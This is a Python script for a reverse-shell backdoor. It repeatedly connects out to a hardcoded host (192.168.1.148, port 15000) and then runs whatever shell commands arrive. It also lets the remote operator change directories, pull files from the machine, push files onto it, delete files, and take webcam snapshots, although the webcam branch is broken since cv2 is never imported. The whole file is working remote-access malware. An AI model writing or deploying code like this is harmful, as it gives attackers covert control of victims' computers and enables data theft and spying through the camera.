import subprocess
import cmd
import os
from doctest import OutputChecker
import socket
# from tkinter.tix import Tree
import time



while True:
    try:
        payload = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        payload.connect(("192.168.1.148",15000))
        print("I am connected")
    except:
        continue
    else:

    # output=payload.recv(2048)
    # print(output.decode('utf-8'))

        def recv_data():
            original_size = payload.recv(2048).decode('utf-8')
            original_size = int(original_size)
            data = payload.recv(2048)
            while len(data) !=original_size:
                data =data + payload.recv(2048)
            return data


        def send_data(output_data):
            size_of_data = len(output_data)
            size_of_data = str(size_of_data)
            payload.send(bytes(size_of_data,'utf-8'))
            payload.send(output_data)

        while True:
            try:
                cmd = payload.recv(2048)
                cmd = cmd.decode('utf-8')
                if cmd == 'quit':
                    payload.close()
                    break
                elif cmd[:2] == 'cd':
                    os.chdir(cmd[3::])
                    send_data(b'Changed Directory')
                    continue
                elif cmd[:8] == 'download':
                    with open(f'{cmd[9::]}',"rb") as data:
                        data_read = data.read()
                        data.close()
                    send_data(data_read)
                    continue 
                elif cmd[:6] == 'upload':
                    data = recv_data()
                    if data == b'error':
                        continue
                    with open(f'{cmd[7::]}','wb') as write_data:
                        write_data.write(data)
                        write_data.close()
                    continue
                elif cmd[:3] == 'del':
                    subprocess.call(cmd,shell=True)
                    send_data(b'Deleted')
                    continue
                elif cmd[:11] == 'webcam_snap':
                    camera =cv2.Videocapture(0)
                    success, image = camera.read()
                    if success:
                        good, final_image = cv2.imencode('.jpg',image)
                        final_image = final_image.tobytes()
                        send_data(final_image)
                    continue
                output= subprocess.check_output(cmd,shell=True)
                send_data(output)
            except FileNotFoundError:
                send_data(b'No File')
                continue
            except subprocess.CalledProcessError:
                send_data(b'Wrong Command')
            except:
                break